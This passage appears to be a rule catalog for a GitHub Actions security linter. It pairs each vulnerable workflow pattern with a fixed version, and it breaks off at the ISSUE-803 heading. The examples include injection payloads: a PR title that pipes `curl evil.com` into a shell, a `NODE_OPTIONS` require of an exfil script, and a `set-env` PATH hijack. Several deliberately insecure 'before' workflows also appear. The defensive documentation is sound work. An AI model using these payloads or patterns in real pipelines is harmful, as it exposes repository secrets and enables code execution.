# GitHub Actions rule catalog

Reference for every rule Plumber runs against GitHub Actions
workflows. Each entry gives the trigger, the risk, and a compilable
**before / after** remediation so you can drop the fix in without
reading the upstream docs.

## Table of contents

### Supply chain — `1xx`

| Code | Name | Severity |
| :--- | :--- | :--- |
| [ISSUE-102](#issue-102--image-mutable-tag) | `image-mutable-tag` | high |
| [ISSUE-103](#issue-103--image-not-pinned-by-digest) | `image-not-pinned-by-digest` | high |
| [ISSUE-701](#issue-104--action-unpinned) | `action-unpinned` | high |
| [ISSUE-704](#issue-105--container-hardcoded-credentials) | `container-hardcoded-credentials` | **critical** |
| [ISSUE-705](#issue-106--cache-poisoning) | `cache-poisoning` | high |
| [ISSUE-706](#issue-107--dockerfile-unpinned-base) | `dockerfile-unpinned-base` | medium |
| [ISSUE-702](#issue-108--action-archived-repo) | `action-archived-repo` | high _(API)_ |
| [ISSUE-707](#issue-109--impostor-commit) | `impostor-commit` | **critical** _(API)_ |
| [ISSUE-708](#issue-110--ref-version-mismatch) | `ref-version-mismatch` | medium _(API)_ |
| [ISSUE-709](#issue-111--stale-action-ref) | `stale-action-ref` | low _(API)_ |
| [ISSUE-712](#issue-112--release-workflow-unsigned) | `release-workflow-unsigned` | medium |
| [ISSUE-710](#issue-113--ref-confusion) | `ref-confusion` | medium _(API)_ |
| [ISSUE-703](#issue-114--known-vulnerable-action) | `known-vulnerable-action` | **critical** _(API)_ |
| [ISSUE-711](#issue-115--superfluous-action) | `superfluous-action` | low |

### Expressions & injections — `2xx`

| Code | Name | Severity |
| :--- | :--- | :--- |
| [ISSUE-207](#issue-206--template-injection) | `template-injection` | **critical** |
| [ISSUE-208](#issue-208--insecure-commands) | `insecure-commands` | high |
| [ISSUE-209](#issue-209--github-env-injection) | `github-env-injection` | **critical** |
| [ISSUE-210](#issue-210--bot-conditions) | `bot-conditions` | high |
| [ISSUE-211](#issue-211--unsound-condition) | `unsound-condition` | medium |
| [ISSUE-212](#issue-212--unsound-contains) | `unsound-contains` | medium |
| [ISSUE-213](#issue-213--unsafe-github-context-dump) | `unsafe-github-context-dump` | high |
| [ISSUE-214](#issue-214--unpinned-package-install) | `unpinned-package-install` | medium |
| [ISSUE-215](#issue-215--template-injection-vars) | `template-injection-vars` | low |

### Secrets, credentials & permissions — `3xx`

| Code | Name | Severity |
| :--- | :--- | :--- |
| [ISSUE-301](#issue-301--overprovisioned-secrets) | `overprovisioned-secrets` | **critical** |
| [ISSUE-302](#issue-302--secrets-inherit) | `secrets-inherit` | high |
| [ISSUE-303](#issue-303--unredacted-secrets) | `unredacted-secrets` | high |
| [ISSUE-801](#issue-304--undocumented-permissions) | `undocumented-permissions` | medium |
| [ISSUE-305](#issue-305--secrets-outside-env) | `secrets-outside-env` | medium |
| [ISSUE-306](#issue-306--github-app-skip-revoke) | `github-app-skip-revoke` | high |
| [ISSUE-307](#issue-307--artipacked) | `artipacked` | high |
| [ISSUE-308](#issue-308--secrets-dynamic-index) | `secrets-dynamic-index` | low |

### Triggers & composition — `4xx`

| Code | Name | Severity |
| :--- | :--- | :--- |
| [ISSUE-802](#issue-414--dangerous-triggers) | `dangerous-triggers` | **critical** |
| [ISSUE-804](#issue-415--pull-request-target-with-head-checkout) | `pull-request-target-with-head-checkout` | **critical** |

### Access & authorisation — `5xx`

| Code | Name | Severity |
| :--- | :--- | :--- |
| [ISSUE-803](#issue-509--excessive-permissions) | `excessive-permissions` | high |

### Workflow hygiene — `6xx`

| Code | Name | Severity |
| :--- | :--- | :--- |
| [ISSUE-601](#issue-601--anonymous-definition) | `anonymous-definition` | low |
| [ISSUE-418](#issue-602--missing-concurrency) | `missing-concurrency` | medium |
| [ISSUE-419](#issue-603--workflow-misfeature) | `workflow-misfeature` | medium |
| [ISSUE-420](#issue-604--workflow-obfuscation) | `workflow-obfuscation` | high |
| [ISSUE-421](#issue-605--use-trusted-publishing) | `use-trusted-publishing` | high |
| [ISSUE-901](#issue-606--dependabot-insecure-exec) | `dependabot-insecure-exec` | **critical** |
| [ISSUE-902](#issue-607--dependabot-missing-cooldown) | `dependabot-missing-cooldown` | low |
| [ISSUE-903](#issue-608--dependency-update-tool-missing) | `dependency-update-tool-missing` | medium |
| [ISSUE-904](#issue-609--sast-workflow-missing) | `sast-workflow-missing` | low |
| [ISSUE-905](#issue-610--security-policy-missing) | `security-policy-missing` | low |

### Run / output conventions

- Every finding prints a clickable `↳ at <file>:<line>` — `Ctrl+click`
  in a VS Code terminal opens the exact job.
- Severity counts drive the **Plumber score** (A–E). Rules tagged
  _(API)_ call GitHub through `gh` and stay silent when `gh auth login`
  has not been set up.
- To turn a rule off, either disable its `ControlName` in
  `.plumber.yaml` or pass `--skip-controls <control-name>`. The
  mapping lives in [`control/codes.go`](../control/codes.go).

---

## ISSUE-102 — `image-mutable-tag`

**Severity:** `high` • **Control:** `containerImageMustNotUseForbiddenTags`

A job's `container.image` uses a tag that appears in the configured
forbidden list (`latest`, `dev`, `main`, glob patterns). Mutable tags
let the registry maintainer — or an attacker who compromises the
registry — swap the image under the job's feet.

```yaml
# ❌ before
jobs:
  build:
    container: node:latest
    runs-on: ubuntu-latest
```

```yaml
# ✅ after — immutable tag
jobs:
  build:
    container: node:20.11.0
    runs-on: ubuntu-latest
```

**Config.** `containerImageMustNotUseForbiddenTags.tags` — list of tags
to forbid.

---

## ISSUE-103 — `image-not-pinned-by-digest`

**Severity:** `high` • **Control:** `containerImageMustNotUseForbiddenTags`

When `containerImagesMustBePinnedByDigest: true`, every `container:`
image must carry a `@sha256:…` digest. Even a version tag like
`20.11.0` can be re-pushed by the registry owner; only the digest is
cryptographically stable.

```yaml
# ❌ before
jobs:
  build:
    container: node:20.11.0
```

```yaml
# ✅ after — digest pin
jobs:
  build:
    container: node:20.11.0@sha256:8b9bc5f36ba5c7c4b3f1e6d0c7a2e9f8b3d1c0a9b2e3c4d5f6a7b8c9d0e1f2a3
```

Tip: `docker inspect --format='{{index .RepoDigests 0}}' node:20.11.0`
prints the digest for the tag you just pulled.

---

## ISSUE-701 — `action-unpinned`

**Severity:** `high` • **Control:** `actionsMustBePinnedByCommitSha`

A workflow step references a third-party action with a mutable ref —
a tag (`@v4`) or a branch (`@main`). Tags and branches are mutable: the
maintainer can retag them, and anyone who compromises the maintainer
account can too. The **tj-actions/changed-files** compromise of March
2025 (CVE-2025-30066) propagated exactly this way across hundreds of
repos.

```yaml
# ❌ before
- uses: peaceiris/actions-gh-pages@v3
```

```yaml
# ✅ after — 40-char commit SHA + documenting comment
- uses: peaceiris/actions-gh-pages@4f9cc6602b3c52e6dd3ff78e1a74bbf0d0a45c9a # v3.9.3
```

**Config.** Enabled by default in the generated `.plumber.yaml`.
`trustedOwners: [actions, github]` exempts first-party GitHub-owned
actions so the initial signal stays focused on the third-party
surface. Pair with Dependabot
(`version-update-strategy: sha-and-version`) to keep pins fresh, or
set `enabled: false` on projects that are not yet ready to migrate.

---

## ISSUE-704 — `container-hardcoded-credentials`

**Severity:** `critical` • **Control:** `containerCredentialsMustComeFromSecrets`

`container.credentials.password` is a plain string committed to git
history. Anyone with clone access — including the entire public on a
public repo — can retrieve it; rotation means rewriting history.

```yaml
# ❌ before
jobs:
  build:
    container:
      image: ghcr.io/org/private:latest
      credentials:
        username: myuser
        password: hunter2
```

```yaml
# ✅ after — secret reference
jobs:
  build:
    container:
      image: ghcr.io/org/private:latest
      credentials:
        username: ${{ secrets.DOCKER_USERNAME }}
        password: ${{ secrets.DOCKER_PASSWORD }}
```

---

## ISSUE-705 — `cache-poisoning`

**Severity:** `high` • **Control:** `releaseWorkflowsMustNotRestoreUntrustedCache`

A release or publish job restores a build cache whose key is not scoped
to the release ref. GitHub caches are shared across branches: a PR on
any feature branch can populate the same key that the release run later
restores, silently injecting compiled artefacts into the published
package. Real attacks have abused this path against PyPI and npm.

```yaml
# ❌ before — cache key shared with every branch
on: [release]
jobs:
  publish:
    steps:
      - uses: actions/cache@v4
        with:
          key: deps-${{ hashFiles('**/package-lock.json') }}
          path: ~/.npm
      - uses: JS-DevTools/npm-publish@v3
```

```yaml
# ✅ after — key weaves github.ref_name so PR caches cannot win
on: [release]
jobs:
  publish:
    steps:
      - uses: actions/cache@v4
        with:
          key: release-${{ github.ref_name }}-${{ hashFiles('**/package-lock.json') }}
          path: ~/.npm
      - uses: JS-DevTools/npm-publish@v3
```

---

## ISSUE-706 — `dockerfile-unpinned-base`

**Severity:** `medium` • **Control:** `dockerfilesMustPinBaseImageByDigest`

A repository Dockerfile uses `FROM image:tag` without an immutable
`@sha256:…` digest. Tags are mutable at the registry level: an
attacker who compromises the registry — or the image maintainer —
can re-push the same tag to point at a different layer, silently
injecting code into every subsequent build. Digest pinning is the
single control that neutralises this vector.

```dockerfile
# ❌ before — tag can be re-pushed under your feet
FROM alpine:3.20
```

```dockerfile
# ✅ after — digest pin, immutable
FROM alpine:3.20@sha256:b7d40c02c23be0ca99da3a0e5e8bd2f0a0a2b3a0e5e8bd2f0a0a2b3a0e5e8bd2
```

`docker inspect --format='{{index .RepoDigests 0}}' alpine:3.20`
prints the digest for the tag you just pulled. Automate refresh
with Dependabot (`package-ecosystem: docker`) or Renovate
(`pinDigests: true`) so the pin stays current.

---

## ISSUE-702 — `action-archived-repo`

**Severity:** `high` _(API)_ • **Control:** `actionsMustNotBeArchived`

The upstream repository hosting the action is archived. No more
security patches, no more compatibility updates — every existing CVE
stays open forever. Pinning by SHA does not help: a stray push by the
last maintainer is still possible.

```yaml
# ❌ before — action hosted in an archived repo
- uses: some-abandoned-org/stale-helper@v1
```

```yaml
# ✅ after — audited, maintained fork (or inline the step)
- uses: my-org/stale-helper@17d1c24…  # v1.2.1 — fork audited 2026-04
```

---

## ISSUE-707 — `impostor-commit`

**Severity:** `critical` _(API)_ • **Control:** `actionRefsMustExistUpstream`

The SHA the workflow pins does not exist in the action's upstream
repository. Two possible roots:

1. A typo — the runner silently falls back to the default branch.
2. The `impostor commit` attack class documented in academic supply
   chain research: a SHA visible in a PR comment or stargazer URL,
   never merged upstream.

Either way, the review trusted a SHA the repository never approved.

```yaml
# ❌ before — SHA does not resolve in actions/checkout
- uses: actions/checkout@deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
```

```yaml
# ✅ after — verify with `gh api repos/<owner>/<repo>/commits/<sha>`
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.1.7
```

---

## ISSUE-708 — `ref-version-mismatch`

**Severity:** `medium` _(API)_ • **Control:** `actionPinCommentsMustMatchSha`

The `# vX.Y.Z` comment trailing a SHA-pinned `uses:` names a version
that does not match the SHA. Reviewers scan diffs and trust the
annotation — a silent downgrade slips through unnoticed.

```yaml
# ❌ before — SHA resolves to v3.5.0 but the comment lies
- uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab # v4.1.0
```

```yaml
# ✅ after — SHA and comment aligned
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.1.7
```

---

## ISSUE-709 — `stale-action-ref`

**Severity:** `low` _(API)_ • **Control:** `actionPinsMustNotBeStale`

The pinned SHA is behind the latest upstream release. The pin still
works, but it misses the security fixes, dependency bumps and runtime
compatibility changes shipped since.

```yaml
# ❌ before — pin is 14 months behind latest
- uses: actions/checkout@72f2cec99f417b1a1c5e2e88945068983b7965f9 # v4.1.1
```

```yaml
# ✅ after — latest release, handled by Dependabot
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.1.7
```

Configure Dependabot with `version-update-strategy: sha-and-version`
to automate the upgrade loop.

---

## ISSUE-712 — `release-workflow-unsigned`

**Severity:** `medium` • **Control:** `releaseWorkflowsMustSignArtefacts`

A release or publish job produces artefacts without any signing
step. Consumers pulling the release then have no cryptographic
handle to verify the artefact was built by the expected pipeline
rather than tampered with along the way (cache poisoning,
compromised runner, repository takeover).

```yaml
# ❌ before — release without signing
name: Release
on: [release]

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make dist
      - uses: softprops/action-gh-release@v2
        with:
          files: dist/*
```

```yaml
# ✅ after — cosign signs each artefact, .sig published alongside
name: Release
on: [release]

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: write
    steps:
      - uses: actions/checkout@v4
      - uses: sigstore/cosign-installer@v3
      - run: make dist
      - run: cosign sign-blob --yes dist/release.tar.gz > dist/release.tar.gz.sig
      - uses: softprops/action-gh-release@v2
        with:
          files: |
            dist/release.tar.gz
            dist/release.tar.gz.sig
```

OIDC-based publish actions with built-in provenance
(`pypa/gh-action-pypi-publish` with trusted publishing,
`npm publish --provenance`) are considered self-signing and stay
silent.

---

## ISSUE-710 — `ref-confusion`

**Severity:** `medium` _(API)_ • **Control:** `actionRefsMustNotCollide`

The action's ref resolves upstream as **both a tag and a branch**
(classic case: a tag `v1` kept alongside a long-lived `v1` branch).
GitHub Actions resolves tags first, so the reference works today,
but a later rename / tag deletion / workflow typo silently switches
the binding. The reviewer cannot tell from the YAML alone which
revision will run.

```yaml
# ❌ before — `v1` exists as both a tag AND a branch on the action repo
- uses: some-org/widget@v1
```

```yaml
# ✅ after — 40-char SHA, unambiguous
- uses: some-org/widget@a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0 # v1.0.3
```

Alternative: ask the action maintainer to drop either the tag or
the branch. Keeping both is a supply-chain landmine for every
caller.

---

## ISSUE-703 — `known-vulnerable-action`

**Severity:** `critical` _(API)_ • **Control:** `actionsMustNotCarryKnownCVEs`

At least one published entry in the GitHub Advisory Database
(`ecosystem=actions`) mentions this action. Running a workflow on a
known-vulnerable release inherits the published vulnerability class
(RCE, secret exfiltration, privilege escalation). Real-world
examples: tj-actions/changed-files (CVE-2025-30066), unpatched
releases of `actions/artifact`.

The finding message carries the full advisory URL for every GHSA
identifier it matched, so the terminal renderer turns each entry
into a clickable link:

```text
CRIT  [ISSUE-703] job "build" references "tj-actions/changed-files@v45" —
       published advisories: GHSA-mrrh-fwg8-r2c3 (https://github.com/advisories/GHSA-mrrh-fwg8-r2c3)
   ↳ at .github/workflows/ci.yml:28
   ↳ docs: https://getplumber.io/docs/cli/issues/ISSUE-703
```

```yaml
# ❌ before — version carrying GHSA-xxxx-xxxx-xxxx
- uses: tj-actions/changed-files@v45.0.0
```

```yaml
# ✅ after — upgrade past the fixed-in version, SHA-pinned
- uses: tj-actions/changed-files@<fixed-sha> # v46.0.1 or later
```

Tip: `gh api "/advisories?ecosystem=actions&affects=tj-actions/changed-files"`
lists every advisory known for an action, with the `vulnerable_version_range`
and `patched_versions` fields.

---

## ISSUE-711 — `superfluous-action`

**Severity:** `low` • **Control:** `actionsMustNotDuplicateRunnerBuiltins`

The workflow reaches for a third-party wrapper that duplicates
functionality already on the runner: `peter-evans/create-pull-request`
around `gh pr create`, `nick-invision/retry` around a three-line
bash retry loop, `mikefarah/yq-action` around the `yq` binary
already on `ubuntu-latest`. Each link is an extra supply-chain
dependency for zero capability gain.

```yaml
# ❌ before
- uses: peter-evans/create-pull-request@v6
  with:
    title: automated
    commit-message: bump
```

```yaml
# ✅ after — `gh` does the job, one less dependency
- env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  run: |
    git checkout -b automated
    git commit -am "bump"
    git push -u origin automated
    gh pr create --title automated --body ""
```

The curated list (conservative by design) tracks the most common
offenders; complex actions like `actions/cache` or `setup-<lang>`
stay off it because they do enough real work to justify the
dependency.

---

## ISSUE-207 — `template-injection`

**Severity:** `critical` • **Control:** `workflowMustNotInjectUserInputInScripts`

A `run:` shell script interpolates `${{ github.event.* }}`,
`${{ github.head_ref }}` or `${{ github.pull_request.* }}` directly.
Under a privileged trigger (`pull_request_target`, `workflow_run`)
those expressions carry PR-author-controlled values; a title crafted
as `"; curl evil.com | sh #` becomes a shell command with the base
repo's secrets.

```yaml
# ❌ before — PR title is pasted straight into the shell
- run: echo "Title is ${{ github.event.pull_request.title }}"
```

```yaml
# ✅ after — env: binding, shell expansion quotes the value
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title is $TITLE"
```

---

## ISSUE-208 — `insecure-commands`

**Severity:** `high` • **Control:** `workflowMustNotReEnableInsecureCommands`

`ACTIONS_ALLOW_UNSECURE_COMMANDS: true` re-enables the deprecated
`::set-env::` / `::add-path::` workflow commands disabled after
CVE-2020-15228. Any log line the attacker can influence rewrites the
running job's environment and PATH.

```yaml
# ❌ before
jobs:
  build:
    env:
      ACTIONS_ALLOW_UNSECURE_COMMANDS: "true"
    steps:
      - run: echo "::set-env name=PATH::/opt/attack:$PATH"
```

```yaml
# ✅ after — validated writes through $GITHUB_ENV / $GITHUB_PATH
jobs:
  build:
    steps:
      - run: echo "BUILD_MODE=release" >> "$GITHUB_ENV"
```

---

## ISSUE-209 — `github-env-injection`

**Severity:** `critical` • **Control:** `workflowMustNotWriteUntrustedContentToGitHubEnv`

A `run:` step appends a value containing a `${{ github.event.* }}` /
`head_ref` / `pull_request.*` expression to `$GITHUB_ENV` or
`$GITHUB_PATH`. Those files are sticky: every following step inherits
the variables / PATH entries. Injecting `NODE_OPTIONS=--require=./exfil.js`
hijacks every later Node invocation.

```yaml
# ❌ before
- run: echo "PR_TITLE=${{ github.event.pull_request.title }}" >> "$GITHUB_ENV"
```

```yaml
# ✅ after — env: binding keeps the template off the redirect line
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR_TITLE=$TITLE" >> "$GITHUB_ENV"
```

---

## ISSUE-210 — `bot-conditions`

**Severity:** `high` • **Control:** `workflowMustNotTrustSpoofableActorChecks`

An `if:` guard tests `github.actor`, `github.triggering_actor`,
`github.event.sender.login`, etc. Those fields reflect whoever opened
the PR — spoofable by a fork with a crafted login. The gate the
author believes is in place does not stop a determined attacker.

```yaml
# ❌ before — spoofable bot check
jobs:
  auto-merge:
    if: github.actor == 'dependabot[bot]'
    runs-on: ubuntu-latest
    steps:
      - run: gh pr merge --auto --squash "$PR_URL"
```

```yaml
# ✅ after — environment-gated approval path
jobs:
  auto-merge:
    environment: dependabot-auto-merge   # required reviewers on the env
    runs-on: ubuntu-latest
    steps:
      - run: gh pr merge --auto --squash "$PR_URL"
```

---

## ISSUE-211 — `unsound-condition`

**Severity:** `medium` • **Control:** `workflowConditionsMustBeSound`

A tautology (`always() || …`, `true == true`) or a contradiction
(`false && …`) in an `if:`. The gate the author thought they installed
is silently absent — the job runs unconditionally (tautology) or never
(contradiction).

```yaml
# ❌ before — always() short-circuits the OR
jobs:
  deploy:
    if: always() || github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

```yaml
# ✅ after — the actual gate
jobs:
  deploy:
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

---

## ISSUE-212 — `unsound-contains`

**Severity:** `medium` • **Control:** `workflowContainsCallsMustBeSound`

`contains(literal, expression)` inverts the built-in's signature.
`contains('main', github.ref)` never matches because `'main'` does not
contain `refs/heads/main` — the gate stays closed while the reviewer
reads the reverse.

```yaml
# ❌ before
if: contains('main', github.ref)
```

```yaml
# ✅ after — haystack first, needle second
if: contains(github.ref, 'refs/heads/main')

# ✅✅ explicit allow-list — clearest
if: contains(fromJSON('["main", "release"]'), github.ref_name)
```

---

## ISSUE-213 — `unsafe-github-context-dump`

**Severity:** `high` • **Control:** `workflowMustNotExportEntireGitHubContext`

A `run:` script, env binding or action input serialises the whole
`github` context (or `github.event`) via `toJson(...)`. The
resulting JSON carries every user-controllable field GitHub exposes
— PR title, issue body, fork branch name, commit message —
bundled together. A single `echo $JSON` downstream leaks the full
attack surface, and passing the blob to a third-party action hands
it the same surface as input.

```yaml
# ❌ before — every github.event field ends up in PAYLOAD
jobs:
  report:
    env:
      PAYLOAD: ${{ toJson(github.event) }}
    steps:
      - run: echo "$PAYLOAD" > /tmp/event.json
```

```yaml
# ✅ after — name the specific fields you need
jobs:
  report:
    env:
      PR_NUMBER: ${{ github.event.pull_request.number }}
      PR_AUTHOR: ${{ github.event.pull_request.user.login }}
    steps:
      - run: jq -n --arg n "$PR_NUMBER" --arg a "$PR_AUTHOR" '{number:$n,author:$a}' > /tmp/event.json
```

Same risk class as ISSUE-207 template-injection, but the dump form
is worse: one line leaks the whole field set rather than one
field.

---

## ISSUE-214 — `unpinned-package-install`

**Severity:** `medium` • **Control:** `workflowMustPinPackageInstalls`

A `run:` step invokes `pip install PKG` or `npm install PKG`
without pinning a version and without a lockfile install. Every
run then resolves whatever is latest on the registry at execution
time — a window exploited repeatedly by typosquat and maintainer-
account compromise attacks.

```yaml
# ❌ before
- run: pip install requests
- run: npm install react
```

```yaml
# ✅ after — lockfile install + inline pin where needed
- run: pip install -r requirements.txt
- run: npm ci
- run: pip install 'pytest==8.3.3'
- run: npm install react@18.3.1
```

Lockfile-based installs (`npm ci`, `pip install -r requirements.txt --require-hashes`)
combine with Dependabot to keep runs reproducible AND fresh.

---

## ISSUE-215 — `template-injection-vars`

**Severity:** `low` • **Control:** `workflowMustNotInjectVarsInScripts`

Same shape as ISSUE-207 template-injection but sourced from
maintainer-adjacent values rather than PR-author input. Two kinds
are flagged:

- `${{ vars.* }}` — repo / org / environment variables set by
  maintainers. Exploitable on a compromised maintainer account or a
  misconfigured org-level variable.
- `${{ inputs.* }}` — inputs to a reusable workflow. When the
  caller proxies `github.event.*` into an input, the surface flips
  to PR-author-controlled.

```yaml
# ❌ before
- run: docker login ${{ vars.REGISTRY }} -u admin -p ${{ secrets.TOKEN }}
```

```yaml
# ✅ after — env binding quotes the value automatically
- env:
    REGISTRY: ${{ vars.REGISTRY }}
    TOKEN: ${{ secrets.TOKEN }}
  run: docker login "$REGISTRY" -u admin -p "$TOKEN"
```

```yaml
# ❌ before — reusable workflow input pasted into a shell
- run: make ${{ inputs.test-command }}

# ✅ after — binding via env:
- env:
    TEST_CMD: ${{ inputs.test-command }}
  run: make "$TEST_CMD"
```

---

## ISSUE-301 — `overprovisioned-secrets`

**Severity:** `critical` • **Control:** `workflowMustNotExportEntireSecretsContext`

`toJson(secrets)` or `toJSON(secrets)` serialises the entire secrets
context into a string and passes it to a step's script, env binding,
or action `with:` input. Every downstream consumer (log, third-party
action, HTTP header) sees the full stock.

```yaml
# ❌ before — every secret ends up in SECRETS_JSON
jobs:
  call:
    env:
      SECRETS_JSON: ${{ toJson(secrets) }}
    steps:
      - run: echo "$SECRETS_JSON" | ./upload
```

```yaml
# ✅ after — one env binding per secret
jobs:
  call:
    steps:
      - env:
          API_TOKEN: ${{ secrets.API_TOKEN }}
        run: ./upload
```

---

## ISSUE-302 — `secrets-inherit`

**Severity:** `high` • **Control:** `reusableWorkflowsMustNotInheritSecrets`

A reusable-workflow call with `secrets: inherit` forwards every secret
visible to the caller. A compromise of the callee — upstream account,
malicious PR merged on the reusable side, tag retag — then sees the
full secret surface of every caller.

```yaml
# ❌ before
jobs:
  call:
    uses: org/shared/.github/workflows/publish.yml@v1
    secrets: inherit
```

```yaml
# ✅ after — explicit per-secret mapping
jobs:
  call:
    uses: org/shared/.github/workflows/publish.yml@v1
    secrets:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

---

## ISSUE-303 — `unredacted-secrets`

**Severity:** `high` • **Control:** `workflowMustNotUnredactSecretsViaFromJSON`

`fromJSON(secrets.X).y` defeats GitHub's automatic log redaction.
Redaction works on the known-secret value; once `fromJSON` parses the
blob, the sub-fields are fresh strings the runtime never saw, so any
later echo leaks them in plain text.

```yaml
# ❌ before — .token bypasses redaction once fromJSON runs
jobs:
  deploy:
    env:
      API_TOKEN: ${{ fromJSON(secrets.CREDS).token }}
    steps:
      - run: echo "token=$API_TOKEN" >> deploy.log
```

```yaml
# ✅ after — split the structured secret, store each leaf separately
jobs:
  deploy:
    env:
      API_TOKEN: ${{ secrets.API_TOKEN }}
    steps:
      - run: echo "token=$API_TOKEN" >> deploy.log
```

---

## ISSUE-801 — `undocumented-permissions`

**Severity:** `medium` • **Control:** `workflowsMustDeclarePermissions`

Neither the workflow nor any job declares a `permissions:` block. The
runner inherits the repository-wide default GITHUB_TOKEN scope —
often `contents: write` or `read-all`. Every step gets more authority
than it needs; any compromise escalates with that larger scope.

```yaml
# ❌ before — inherits the repo default
name: Build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: make build
```

```yaml
# ✅ after — least-privilege declaration
name: Build
on: [push]
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: make build
```

---

## ISSUE-305 — `secrets-outside-env`

**Severity:** `medium` • **Control:** `deployJobsMustUseEnvironmentGate`

A deploy / publish job (trigger `release` or a canonical publish
action) reads secrets without an `environment:` gate. Environments are
the GitHub hook for required reviewers, wait timers, and deployment
branch rules — without one, the trigger leads straight to the secret.

```yaml
# ❌ before — no environment, no reviewer in the loop
name: Publish
on: [release]
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: twine upload --password ${{ secrets.PYPI_TOKEN }} dist/*
```

```yaml
# ✅ after — environment: production with reviewers configured on it
name: Publish
on: [release]
jobs:
  publish:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: twine upload --password ${{ secrets.PYPI_TOKEN }} dist/*
```

---

## ISSUE-306 — `github-app-skip-revoke`

**Severity:** `high` • **Control:** `githubAppTokensMustBeRevokedOnExit`

A step mints a GitHub App installation token with
`skip-token-revoke: true`. The token survives the run and becomes a
long-lived credential — any later leak (log, artefact, restored cache)
stays exploitable instead of meeting a revoked token.

```yaml
# ❌ before
- uses: actions/create-github-app-token@v1
  id: app-token
  with:
    app-id: ${{ vars.APP_ID }}
    private-key: ${{ secrets.APP_PRIVATE_KEY }}
    skip-token-revoke: true
```

```yaml
# ✅ after — default behaviour revokes on exit
- uses: actions/create-github-app-token@v1
  id: app-token
  with:
    app-id: ${{ vars.APP_ID }}
    private-key: ${{ secrets.APP_PRIVATE_KEY }}
```

---

## ISSUE-307 — `artipacked`

**Severity:** `high` • **Control:** `checkoutMustNotPersistCredentials`

`actions/checkout` writes the GITHUB_TOKEN into the cloned repo's
`.git/config` by default. Any later step that uploads `.git` as part
of an artefact, or that runs fork-controlled code, can exfiltrate the
token.

```yaml
# ❌ before — token persisted
- uses: actions/checkout@v4
```

```yaml
# ✅ after — disable credential persistence
- uses: actions/checkout@v4
  with:
    persist-credentials: false
```

---

## ISSUE-308 — `secrets-dynamic-index`

**Severity:** `low` • **Control:** `workflowMustNotIndexSecretsDynamically`

A workflow reads `${{ secrets[expr] }}` where `expr` is not a
quoted literal — typically an `env.VAR_NAME`, `inputs.*`,
`matrix.*`, or a computed expression. The bracket form defers the
secret name resolution to runtime, which effectively hands read
access to every secret the job can see to whatever drives `expr`.
A later refactor that threads a template expression through the
index silently promotes the weakness.

```yaml
# ❌ before — which secret is read depends on an env binding
jobs:
  e2e:
    env:
      OSC_ACCESS_KEY_NAME: PROD_AK
    steps:
      - env:
          OSC_ACCESS_KEY: ${{ secrets[env.OSC_ACCESS_KEY_NAME] }}
        run: ./run-e2e.sh
```

```yaml
# ✅ after — secret named directly, grant surface explicit
jobs:
  e2e:
    steps:
      - env:
          OSC_ACCESS_KEY: ${{ secrets.PROD_AK }}
        run: ./run-e2e.sh
```

When a matrix genuinely needs to choose among N secrets, split the
job into N jobs with static names — the verbosity is worth the
reviewability.

---

## ISSUE-802 — `dangerous-triggers`

**Severity:** `critical` • **Control:** `workflowMustNotUseDangerousTriggers`

A job runs under a trigger that combines attacker-controlled input with
the base repository's secrets — `pull_request_target`, `workflow_run`,
`issue_comment`, `pull_request_review`, `pull_request_review_comment`,
`discussion`, `discussion_comment`, `gollum`, `fork` — **and checks out
fork-controlled code** (an `actions/checkout` whose `ref:` is the PR or
workflow_run head). Untrusted code then executes with the base repo's
secrets and token — the March 2025 tj-actions compromise (CVE-2025-30066).

Subscribing to such a trigger is **not** flagged on its own: metadata
jobs — labelling, milestones, comments, notifications — legitimately
need them and are safe without an untrusted checkout. The finding fires
only on the exploitable combination, and abstains when a job-level `if:`
restricts execution to same-repository pull requests.

```yaml
# ❌ before — pull_request_target checks out the PR head
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  preview:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install && npm test
```

```yaml
# ✅ after — same-repository guard: fork code never runs
jobs:
  preview:
    if: github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install && npm test
```

Alternative: run fork code under a plain `pull_request` trigger (no
base-repo secrets), or drop the head checkout entirely.

---

## ISSUE-804 — `pull-request-target-with-head-checkout`

**Severity:** `critical` • **Control:** `pullRequestTargetMustNotCheckoutHead`

`pull_request_target` AND an explicit checkout of the PR head
(`github.event.pull_request.head.sha`, `github.head_ref`). Base-repo
secrets plus fork-controlled code in the same run: the exact vector
of CVE-2025-30066.

```yaml
# ❌ before — the literal tj-actions pattern
name: Preview
on: [pull_request_target]
jobs:
  preview:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install && npm test
```

```yaml
# ✅ after — split trigger: metadata under pull_request_target,
#            fork code under a plain pull_request handoff
name: Preview — metadata
on: [pull_request_target]
permissions:
  pull-requests: write
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4     # base repo, no ref: override
      - run: gh pr edit --add-label auto-preview
```

---

## ISSUE-803 — `excessive-permissions`

